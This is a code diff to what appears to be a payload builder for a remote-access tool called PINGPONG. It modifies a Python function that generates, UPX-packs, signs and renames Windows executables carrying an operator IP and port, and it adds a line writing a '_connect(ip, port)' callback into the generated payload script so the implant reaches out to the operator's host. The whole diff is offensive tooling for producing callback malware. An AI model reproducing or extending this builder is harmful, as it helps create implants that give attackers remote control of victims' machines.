@@ -58,7 +58,7 @@ def find_mod_location(lst, p):
 				is_find_end = True
 		line_count += 1
 	return start_list_location
-def pack(payload, printf, upx_command, file_format, is_ask=True, is_ask_ip='', is_ask_port=0, is_basic_payload=False, _payload_id='', is_return_main=True):
+def pack(payload, printf, upx_command, file_format, is_ask=True, is_ask_ip='', is_ask_port=0, is_basic_payload=False, _payload_id='', is_return_main=True, is_print_done=True):
 	import main, config
 	if not '--upx-dir' in upx_command:
 		if upx_command != " " and upx_command != "":
@@ -213,7 +213,7 @@ PINGPONG_client("{ip}", {port})""")
 			remove(f"{father_path}/upload_payload/PINGPONG_payload_sign.exe")
 			remove(f"{father_path}/upload_payload/PINGPONG_payload.exe")
 			rename(f"{f_father_path}/payload/upload_payload/PINGPONG_payload_sign_twice.exe", f"{f_father_path}/payload/upload_payload/{_payload_id}.exe")
-			if printf:
+			if printf and is_print_done:
 				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.exe")
 				if is_return_main:
 					main.main()
@@ -224,12 +224,14 @@ PINGPONG_client("{ip}", {port})""")
 				pay = basic_pay.read()
 			with open("_payload.py", "w+", encoding="utf8") as a:
 				payload_id = generate_random_str()
-				a.write(f"_id = {payload_id}")
+				a.write(f"_id = '{payload_id}'")
 				a.write(pay)
+				a.write(f'''
+_connect("{ip}", {port})				''')
 			_choose = input("payload>[*]Generate a backup payload?[y/n]")
 			if _choose == 'y' or _choose == 'Y' or _choose == 'yes' or _choose == 'YES' or _choose == '' or _choose == ' ':
 				upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
-				pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
+				pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe', is_basic_payload=True, _payload_id=payload_id, is_print_done=False, is_ask=False, is_ask_ip=ip, is_ask_port=port)
 			else:
 				main.print_warn(f'payload>[!]The payload will generate it when you got the connection')
 			if printf:
